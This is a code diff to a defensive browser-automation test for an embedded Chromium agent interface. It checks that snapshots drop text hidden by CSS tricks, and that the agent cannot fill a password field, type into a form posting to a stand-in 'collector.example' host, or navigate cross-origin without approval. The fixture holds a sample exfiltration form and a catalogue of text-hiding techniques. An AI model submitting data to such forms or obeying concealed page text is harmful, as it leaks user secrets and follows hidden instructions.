@@ -60,7 +60,13 @@ test('embedded Chromium preserves history, routes Seed links, and isolates websi
       <meta name="description" content="Fixture description">
       <article><h1>Article heading</h1><p>Archive this <strong>content</strong>.</p><p style="display:none">hidden-secret</p></article>
       <input id="remember" aria-label="Remember" value="initial">
-      <input type="password" value="password-secret">
+      <input type="password" aria-label="Password" value="password-secret">
+      <p style="opacity:0">opacity-secret</p>
+      <p style="position:absolute;left:-9999px">offscreen-secret</p>
+      <p style="font-size:1px">tiny-secret</p>
+      <p style="color:transparent">transparent-secret</p>
+      <span style="position:absolute;width:1px;height:1px;overflow:hidden;clip-path:inset(50%)">clip-secret</span>
+      <form action="https://collector.example/submit"><input aria-label="Leak"></form>
       <a id="next" href="/redirect">Next</a>
       <a id="seed" href="hm://alice/docs">Seed document</a>
       <a id="popup" href="/popup" target="_blank">Popup</a>`)
@@ -142,16 +148,34 @@ test('embedded Chromium preserves history, routes Seed links, and isolates websi
     const command = (input: Record<string, unknown>) =>
       page.evaluate((input) => (window as any).browserTest.execute(input), {connectionId, command: input})
     await expect(command({action: 'snapshot'})).rejects.toThrow('Browser access is paused')
-    await page.evaluate((input) => (window as any).browserTest.access(input), {
-      connectionId,
-      browserId,
-      accountUid: 'fixture-account',
-      enabled: true,
-    })
+    const grant = {connectionId, browserId, accountUid: 'fixture-account', enabled: true}
+    await page.evaluate((input) => (window as any).browserTest.access(input), grant)
+    // A connection alone is not permission: the user has to allow this website.
+    await expect(command({action: 'snapshot'})).rejects.toThrow('has not allowed browser access')
+    await page.evaluate((input) => (window as any).browserTest.access(input), {...grant, origins: [origin]})
     const snapshot = await command({action: 'snapshot'})
     expect(snapshot.text).toContain('Article heading')
-    expect(JSON.stringify(snapshot)).not.toContain('password-secret')
-    expect(JSON.stringify(snapshot)).not.toContain('hidden-secret')
+    for (const secret of [
+      'password-secret',
+      'hidden-secret',
+      'opacity-secret',
+      'offscreen-secret',
+      'tiny-secret',
+      'transparent-secret',
+      'clip-secret',
+    ])
+      expect(JSON.stringify(snapshot)).not.toContain(secret)
+    const ref = (name: string) => snapshot.elements.find((element: any) => element.name === name).ref
+    await expect(
+      command({action: 'type', document: snapshot.document, ref: ref('Password'), text: 'guess'}),
+    ).rejects.toThrow('Password fields are for the user')
+    await expect(
+      command({action: 'type', document: snapshot.document, ref: ref('Leak'), text: 'secret'}),
+    ).rejects.toThrow('submits to another website')
+    const otherOrigin = origin.replace('127.0.0.1', 'localhost')
+    await expect(
+      command({action: 'navigate', document: snapshot.document, url: `${otherOrigin}/first`}),
+    ).rejects.toThrow("needs the user's approval")
     expect(await guest.evaluate((contents) => contents.executeJavaScript('typeof window.__seedBrowser'))).toBe(
       'undefined',
     )
